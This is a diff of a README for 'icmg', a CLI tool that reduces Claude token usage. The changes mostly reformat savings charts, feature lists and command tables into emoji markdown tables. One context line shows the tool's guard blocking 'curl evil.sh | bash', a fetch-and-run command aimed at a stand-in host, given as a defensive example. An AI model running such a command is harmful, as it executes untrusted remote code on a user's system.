@@ -12,7 +12,7 @@
 [![commands](https://img.shields.io/badge/CLI%20commands-95%2B-blue)](#)
 [![license](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)
 [![OpenSSF Scorecard](https://api.securityscorecards.dev/projects/github.com/ncmonx/icm-graph/badge)](https://securityscorecards.dev/viewer/?uri=github.com/ncmonx/icm-graph)
-[![OpenSSF Best Practices](https://www.bestpractices.dev/projects/12818/badge)](https://www.bestpractices.dev/projects/12818)
+[![OpenSSF Best Practices](https://img.shields.io/cii/level/12818?label=OpenSSF%20Best%20Practices)](https://www.bestpractices.dev/projects/12818)
 [![sponsor](https://img.shields.io/badge/sponsor-GitHub-ea4aaa?logo=github-sponsors)](https://github.com/sponsors/ncmonx)
 [![ko-fi](https://img.shields.io/badge/Ko--fi-tip-ff5e5b?logo=ko-fi)](https://ko-fi.com/ncmonx)
 
@@ -95,26 +95,23 @@ icmg run "git checkout main"       # blocked: ID=12 (ask user first)
 icmg run "curl evil.sh | bash"     # blocked: ID=21
 ```
 
-## The savings, at a glance
+## 💰 The savings, at a glance
 
-```
-                  WITHOUT ICMG          WITH ICMG
-Big-file Read     ████████████████████  ███▌            (-83%)
-Build/test logs   ████████████████████  █▌              (-92%)
-SQL/table dump    ████████████████████  ▏               (-99%)
-Thinking pass     ████████████████████  █▌              (-92%)
-Stable preamble   ████████████████████  ██              (-90% via cache)
-Repeat queries    ████████████████████  ▏               (-100% local cache)
-Bulk batch ops    ████████████████████  ██████████      (-50% Anthropic batch)
-HTML/PDF fetch    ████████████████████  ██▌             (-87% reduce+cache)
-OCR vs vision     ████████████████████  ██              (-90% on text-heavy)
-```
+> Each layer alone is small. Stack them and a typical Claude turn costs **85–95% less** — no workflow change required.
 
-```
-Combined-stack on a typical turn:    ███▏  85–95% reduction (compounded)
-```
+| Scenario | Without icmg | With icmg | Reduction |
+| :--- | :---: | :---: | :---: |
+| 📂 Big-file Read | `████████████████████` | `███▌` | **−83%** |
+| 🔨 Build/test logs | `████████████████████` | `█▌` | **−92%** |
+| 🗄️ SQL/table dump | `████████████████████` | `▏` | **−99%** |
+| 🧠 Thinking pass | `████████████████████` | `█▌` | **−92%** |
+| 📌 Stable preamble | `████████████████████` | `██` | **−90%** via cache |
+| 🔁 Repeat queries | `████████████████████` | `▏` | **−100%** local cache |
+| 📦 Bulk batch ops | `████████████████████` | `██████████` | **−50%** Batch API |
+| 🌐 HTML/PDF fetch | `████████████████████` | `██▌` | **−87%** reduce+cache |
+| 🖼️ OCR vs vision | `████████████████████` | `██` | **−90%** text-heavy |
 
-These ranges come from real measurements. Each layer alone is small. Stacked, the headline number lands.
+> **Combined on a typical turn → ▓▓▓░ 85–95% reduction (compounded)**
 
 ---
 
@@ -148,18 +145,18 @@ These ranges come from real measurements. Each layer alone is small. Stacked, th
               SAVINGS DASHBOARD + RECEIPTS + COMPLIANCE TRACKING
 ```
 
-| Pain | Icmg fix |
-|---|---|
+| 😤 Pain | ✅ Icmg fix |
+| :--- | :--- |
 | Big files inflate every prompt | Surgical context bundles — only what the task actually needs |
 | Noisy command output drowns the model | Output filtering tuned per command type (ANSI strip, dedup ×N, blank collapse) |
 | Same bug solved twice | Persistent memory that surfaces past fixes when they apply |
 | `/clear` wipes hard-won context | Snapshots + auto-distill of session decisions |
-| Models "think" 8K tokens for a one-line rename | Intent-aware directives + caveman mode kill thinking outright |
+| Models "think" 8K tokens for a one-line rename | Intent-aware directives + caveman mode kills thinking outright |
 | Re-sending the same project preamble every turn | Long-lived prompt-cache markers — pay once, reuse cheap |
 | 30K tokens of logs / diffs / dumps | Lossless context compression with reversible round-trips |
 | AI keeps trying the same broken approach | Anti-pattern memory (`icmg fail`) — failures become guardrails |
 | AI "forgets" your CLAUDE.md instructions | Hard-enforcement hooks block disallowed reads/fetches |
-| Native `Read` bypasses everything | Read cap-and-allow hook caps at 30 lines via `updatedInput.limit` + icmg-context overlay |
+| Native `Read` bypasses everything | Read cap-and-allow hook caps at 30 lines + icmg-context overlay |
 | Same task already solved in another project | `icmg cross-recall` federates memory across all registered projects |
 | DB grows unbounded over months | `icmg cron install` autopilots weekly prune (Windows schtasks / POSIX cron) |
 | Wrong zone wastes BM25 IDF | Auto-zone detect from task keywords (10 zones); no manual `--zone X` |
@@ -196,38 +193,33 @@ That's it. Nothing else to configure.
 
 ---
 
-## Headline numbers (measured)
+## 📊 Headline numbers (measured)
 
-```
-LAYER                       SAVING            SOURCE
-─────────────────────────────────────────────────────────────────────
-Big-file Read           60–80% smaller       file slice, 100-line cap
-Build/test logs         80–95% smaller       icmg run filter pipeline
-SQL/table dumps         95–99% smaller       per-tool shrink strategy
-Thinking overhead       50–90% off           --no-think + caveman
-Stable preamble         90% off              prompt-cache markers
-Repeat queries          100% off             tool_call_cache (5min TTL)
-Bulk operations         50% off              Anthropic Batch API emit
-HTML/PDF fetch          70–90% off           icmg fetch reduce + cache
-Screenshot OCR          90–95% off           icmg ingest pytesseract
-Read repeat-dedup       ~100% on dup         30-min sliding window
-Pack on-repeat          60–97% smaller       icmg pack --diff
-Symbol-slice context    80%+ per lookup      icmg context --symbol (one fn, not whole file)
-Live stream dedup       real-time lines      icmg run --stream (filter summary at end)
-File copy no-output    97% per write        icmg copy --from (zero output tokens generated)
-Filter ANSI/dedup       30–60% on noisy CLI  npm/cargo/pnpm output
-Caveman mode            ~75% on responses    fragment-style directive
-─────────────────────────────────────────────────────────────────────
-COMBINED ON TYPICAL TURN          ≈ 85–95%
-```
+| Layer | Saving | Mechanism |
+| :--- | :---: | :--- |
+| 📂 **Big-file Read** | **60–80% smaller** | File slice, 100-line cap |
+| 🔨 **Build/test logs** | **80–95% smaller** | `icmg run` filter pipeline |
+| 🗄️ **SQL/table dumps** | **95–99% smaller** | Per-tool shrink strategy |
+| 🧠 **Thinking overhead** | **50–90% off** | `--no-think` + caveman mode |
+| 📌 **Stable preamble** | **90% off** | Prompt-cache markers |
+| 🔁 **Repeat queries** | **100% off** | `tool_call_cache` (5 min TTL) |
+| 📦 **Bulk operations** | **50% off** | Anthropic Batch API emit |
+| 🌐 **HTML/PDF fetch** | **70–90% off** | `icmg fetch` reduce + cache |
+| 🖼️ **Screenshot OCR** | **90–95% off** | `icmg ingest` pytesseract |
+| ♻️ **Read repeat-dedup** | **~100% on dup** | 30-min sliding window |
+| 🔄 **Pack on-repeat** | **60–97% smaller** | `icmg pack --diff` |
+| 🔬 **Symbol-slice context** | **80%+ per lookup** | `icmg context --symbol` (one fn, not whole file) |
+| 🚿 **Filter ANSI/dedup** | **30–60%** on noisy CLI | npm/cargo/pnpm output |
+| 📋 **File copy no-output** | **97% per write** | `icmg copy --from` (zero output tokens) |
+| 🗣️ **Caveman mode** | **~75% on responses** | Fragment-style directive |
 
-Token-cost savings at scale: roughly **\$0.10 per non-trivial Claude turn**, hundreds of dollars a month for active users.
+> 💰 **Combined on a typical turn: ≈ 85–95% — ~$0.10 saved per non-trivial Claude turn, hundreds per month at scale.**
 
 ---
 
-## Coverage dashboard
+## 📈 Coverage dashboard
 
-`icmg savings` shows where the savings actually came from:
+`icmg savings` shows exactly where the savings came from, with receipts and cost breakdown:
 
 ```
 icmg savings — last 30 days
@@ -256,101 +248,63 @@ Strict-mode denials in window: 8
 
 ---
 
-## Highlights
+## ✨ Highlights
 
-```
-ONE BINARY            ▸ ~30 MB Windows .exe, no node_modules / venv / Docker
-LOCAL-FIRST           ▸ Per-project SQLite. Never phones home
-MCP SERVER            ▸ 28 tools — recall, store, graph, sync, fetch, batch …
-                        Plugs into Claude Code, Cline, Continue, anything MCP
-PROJECT FEDERATION    ▸ icmg cross-recall — "this was done in project X" lookup
-                        across all registered projects (memory + receipts)
-AUTOPILOT HYGIENE     ▸ icmg cron install — weekly memory prune (auto/session/
-                        fail/correction rotation + telemetry trim) zero-touch
-AUTO-ZONE             ▸ Pack infers zone from keywords (10 zones); sharper IDF
-                        without manual flag — auth/db/graph/imem/tkil/mcp/ui/
-                        cli/hooks/compress
-DASHBOARD             ▸ icmg serve → http://127.0.0.1:8080/
-AST-AWARE             ▸ tree-sitter for C/C++/Python/TypeScript/Go/Rust/Java/
-                        C#/Ruby/Bash/Kotlin/Lua — exact symbols, line ranges,
-                        body hashes. Regex fallback for the rest
-TEAM-FRIENDLY         ▸ Memory + graph share via git-tracked JSONL snapshots
-IMAGE-AWARE           ▸ Local OCR for screenshots; 90%+ vs vision API
-HARD ENFORCEMENT      ▸ Hooks block native Read/WebFetch when icmg has it
-SELF-REPAIR           ▸ DLL sha256 auto-rollback, lock recovery, pending-restart
-SELF-PROTECTION       ▸ Atomic snapshots (24h/7d/4w/6m pyramidal) +
-                        ping-pong dual-mirror (2× live, instant failover) +
-                        7-stage graph integrity check + auto on every upgrade
-HOT-CONTEXT CACHE     ▸ Re-issue same icmg context/compress within session →
-                        ~5ms cache hit (15-30× cold→hot). Boosts hot files
-                        in graph rank automatically. Self-invalidating on edit
-SELF-MAINTENANCE      ▸ icmg maintain run auto-detects HEAVY/IDLE state →
-                        prune chain → keeps only active graph in idle mode
-DRIFT GATE            ▸ icmg drift pin/check — pinned decisions get 10× recall
-                        boost; every prompt matched against anchors;
-                        contradictions flagged BEFORE the model commits
-SENTINEL WATCHDOG     ▸ icmg sentinel — 15-min health checks; auto-prunes when
-                        disk/cache/audit growth crosses thresholds; halts cold
-                        at ≥3 reactions/hour (loop-safe by design)
-SHADOW AUTO-UPGRADE   ▸ icmg shadow-upgrade — daily background poll of GitHub;
-                        sha256-verified download to ~/.icmg/shadow/<version>/;
-                        atomic swap on next invocation. Chrome-style. No
-                        teammate left behind on stale features. Pin/opt-out
-                        available
-AUDIT TRAIL           ▸ chain-signed log of every backup/restore/failover/
-                        sentinel reaction. icmg repair-history verify walks
-                        the chain — tamper-detectable
-SYMBOL SLICE          ▸ icmg context <file> --symbol <Name> — one function body,
-                        not the whole module. 80%+ token cut vs full-file read.
-                        Substring + case-insensitive match. Precision surgical
-SESSION DEDUP         ▸ Recall auto-suppresses nodes already returned this session
-                        — identical results stop flooding multi-turn context.
-                        --no-dedup to override. Zero latency (in-memory set)
-LIVE STREAM FILTER    ▸ icmg run --stream — real-time line-by-line subprocess
-                        output with filter summary appended at end. No buffering
-                        lag; full filter context preserved for summary accuracy
-CONTEXT GRAPH         ▸ CLAUDE.md sections auto-imported as BM25-searchable nodes.
-                        ~93% less context on session start — only relevant sections
-                        injected per prompt. No manual CLAUDE.md load needed
-SKILL STORE           ▸ Skill .md files indexed into the graph (tier=skill).
-                        Matching skills suggested automatically per prompt via hook.
-                        Never miss an applicable skill again. icmg skill index
-RULE ENFORCEMENT      ▸ Persistent enforcement daemon: rules stored in DB, not hooks.
-                        Read/Glob/Grep calls evaluated at 2-5 ms (10x faster).
-                        Files >=500 lines blocked; focused alternative suggested
-KNOWLEDGE BROWSER     ▸ icmg knowledge list/add/edit/delete — full CRUD on context
-                        graph. HTML dashboard at icmg serve /knowledge.
-                        Toggle nodes active/inactive without deleting
-APACHE-2.0            ▸ License preserved on releases
-```
+| | Feature | Details |
+| :---: | :--- | :--- |
+| 🔋 | **One binary** | ~30 MB Windows .exe — no node_modules, venv, or Docker |
+| 🏠 | **Local-first** | Per-project SQLite — never phones home |
+| 🔌 | **MCP server** | 28 tools (recall, store, graph, sync, fetch, batch…) — Claude Code, Cline, Continue, anything MCP |
+| 🗺️ | **Project federation** | `icmg cross-recall` — "this was done in project X" across all registered projects |
+| 🤖 | **Autopilot hygiene** | `icmg cron install` — weekly prune (auto/session/fail/correction rotation), zero-touch |
+| 🎯 | **Auto-zone** | Pack infers zone from keywords (10 zones: auth/db/graph/imem/tkil/mcp/ui/cli/hooks/compress) |
+| 📊 | **Dashboard** | `icmg serve` → [http://127.0.0.1:8080/](http://127.0.0.1:8080/) — graph, memory, savings, knowledge browser |
+| 🌳 | **AST-aware** | tree-sitter for C/C++/Python/TypeScript/Go/Rust/Java/C#/Ruby/Bash/Kotlin/Lua — exact symbols, line ranges, body hashes |
+| 👥 | **Team-friendly** | Memory + graph share via git-tracked JSONL snapshots |
+| 🖼️ | **Image-aware** | Local OCR for screenshots — 90%+ token cut vs vision API |
+| 🔒 | **Hard enforcement** | Hooks block native Read/WebFetch when icmg has it; leash hook blocks all raw Bash |
+| 🔧 | **Self-repair** | DLL sha256 auto-rollback, lock recovery, pending-restart across versions |
+| 🛡️ | **Self-protection** | Atomic snapshots (24h/7d/4w/6m pyramidal) + dual-mirror ping-pong + 7-stage graph integrity |
+| ⚡ | **Hot-context cache** | Re-issue same `icmg context/compress` → ~5 ms cache hit (15–30× cold→hot), self-invalidating on edit |
+| 🧹 | **Self-maintenance** | `icmg maintain run` — HEAVY/IDLE detection → prune chain → bounded growth, zero-touch |
+| 📍 | **Drift gate** | `icmg drift pin` — pinned decisions get 10× recall boost; contradictions flagged before model commits |
+| 👁️ | **Sentinel watchdog** | 15-min health checks; auto-prunes disk/cache/audit; loop-safe (halt at ≥3 reactions/hour) |
+| 🔄 | **Shadow auto-upgrade** | Daily background GitHub poll → sha256-verified → atomic swap on next invocation. Chrome-style |
+| 📋 | **Audit trail** | Chain-signed log of every backup/restore/failover/sentinel reaction — tamper-detectable |
+| 🔬 | **Symbol slice** | `icmg context --symbol <Name>` — one function body, not the whole module. 80%+ token cut |
+| 🚫 | **Session dedup** | Recall suppresses already-returned nodes — no repeat flooding. `--no-dedup` to override |
+| 🌊 | **Live stream filter** | `icmg run --stream` — real-time line-by-line output + filter summary appended at end |
+| 📚 | **Context graph** | CLAUDE.md auto-imported as BM25-searchable nodes — ~93% less context on session start |
+| 🎓 | **Skill store** | Skill `.md` files indexed; matching skills auto-suggested per prompt via hook |
+| ⚖️ | **Rule enforcement** | DB-stored rules evaluated at 2–5 ms (10× faster than hook checks); 500-line file guard |
+| 🗂️ | **Knowledge browser** | `icmg knowledge list/add/edit/delete` + HTML dashboard at `icmg serve /knowledge` |
 
 ---
 
-## When to use which command
+## 🗺️ When to use which command
 
-| Situation | Run |
-|---|---|
-| Starting a task | `icmg pack "<task>"` — one bundle, not 5–10 reads |
-| Need a single file | `icmg context <file>` — surgical, not full Read |
-| Need lines 60–95 | `icmg context <file> --lines 60-95` — replaces Read offset/limit |
-| Any noisy command | `icmg run <cmd>` — filtered output |
-| PR review | `icmg diff-summary` — symbol-grouped, not raw diff |
-| Big text input | `icmg compress` — cut tokens, reverse-able |
-| Past decisions | `icmg recall "<query>"` — surfaces what you already learned |
-| Failed approach | `icmg fail store/recall` — anti-pattern memory |
-| Same task in another project | `icmg cross-recall "<prompt>"` — federate across registered projects |
-| Auto-prune old memory weekly | `icmg cron install` — Win schtasks / POSIX cron, zero-touch |
-| Auto-zone for sharper recall | `icmg pack "<task>"` — infers `auth`/`db`/`graph`/etc. from keywords |
-| AI ignored CLAUDE.md | `icmg strict on` — hooks enforce rules at harness level |
-| Full LLM pipeline | `icmg agent "<task>"` — pack + cache + directives + retry |
-| Bulk Anthropic | `icmg batch --task ...` — 50% via Batch API |
-| Download URL | `icmg fetch <url>` — reduced + cached (70-90% off) |
-| Screenshot | `icmg ingest screenshot.png` — OCR text-only payload |
-| Team share | `icmg sync init/push/pull` — git-tracked JSONL |
-| Audit savings | `icmg savings` — console / `--html` / `--json` |
-| Real session tokens | `icmg context-budget` — covers ALL sources |
-| What changed | `icmg whats-new` — release notes after `update` |
-| Visual graph | `icmg serve` — embedded HTTP dashboard |
+| Situation | Command |
+| :--- | :--- |
+| 🚀 Starting a task | `icmg pack "<task>"` — one bundle, not 5–10 reads |
+| 📂 Need a single file | `icmg context <file>` — surgical, not full Read |
+| 📏 Need lines 60–95 | `icmg context <file> --lines 60-95` — replaces Read offset/limit |
+| 🔨 Any noisy command | `icmg run <cmd>` — filtered output |
+| 🔍 PR review | `icmg diff-summary` — symbol-grouped, not raw diff |
+| 📦 Big text input | `icmg compress` — cut tokens, reversible |
+| 🧠 Past decisions | `icmg recall "<query>"` — surfaces what you already learned |
+| ❌ Failed approach | `icmg fail store/recall` — anti-pattern memory |
+| 🗺️ Same task in another project | `icmg cross-recall "<prompt>"` — federate across projects |
+| 🤖 Auto-prune old memory | `icmg cron install` — Win schtasks / POSIX cron, zero-touch |
+| 🔒 AI ignored CLAUDE.md | `icmg strict on` — hooks enforce rules at harness level |
+| 🤖 Full LLM pipeline | `icmg agent "<task>"` — pack + cache + directives + retry |
+| 💰 Bulk Anthropic | `icmg batch --task ...` — 50% off via Batch API |
+| 🌐 Download URL | `icmg fetch <url>` — reduced + cached (70–90% off) |
+| 🖼️ Screenshot | `icmg ingest screenshot.png` — OCR text-only payload |
+| 👥 Team share | `icmg sync init/push/pull` — git-tracked JSONL |
+| 📈 Audit savings | `icmg savings` — console / `--html` / `--json` |
+| 📊 Real session tokens | `icmg context-budget` — covers ALL sources |
+| 🆕 What changed | `icmg whats-new` — release notes after `update` |
+| 📡 Visual graph | `icmg serve` — embedded HTTP dashboard |
 | **DB safety net** | `icmg backup snapshot` / `icmg backup restore latest` / `icmg backup restore-from <file>` — atomic, schema-checked; cross-project restore supported |
 | **Instant failover** | `icmg mirror failover` — swaps in valid mirror in seconds |
 | **Self-clean heavy/idle DB** | `icmg maintain run` — auto-detects state, chains prune + integrity |
@@ -386,19 +340,19 @@ Optional capabilities are exactly that — optional. Default build runs everywhe
 
 ---
 
-## How it pays off in practice
+## 📅 How it pays off in practice
 
 After a few days of use you'll notice:
 
-```
-Day 1   ▸ Sessions get visibly longer before /compact fires
-Day 3   ▸ Recurring questions answer themselves from memory
-Day 7   ▸ Big PR reviews stop blowing the context window
-Day 14  ▸ Cache hit-rate climbs as you settle into patterns
-Day 30  ▸ Your monthly Claude bill stops scaring you
-```
+| Milestone | What changes |
+| :---: | :--- |
+| **Day 1** | Sessions get visibly longer before `/compact` fires |
+| **Day 3** | Recurring questions answer themselves from memory |
+| **Day 7** | Big PR reviews stop blowing the context window |
+| **Day 14** | Cache hit-rate climbs as you settle into patterns |
+| **Day 30** | Your monthly Claude bill stops scaring you |
 
-Memory recall sharpens over time. Snapshot restore gets faster. Compression learns your codebase's repeated terms. The system compounds.
+Memory recall sharpens over time. Snapshot restore gets faster. Compression learns your codebase's repeated terms. **The system compounds.**
 
 ---
 
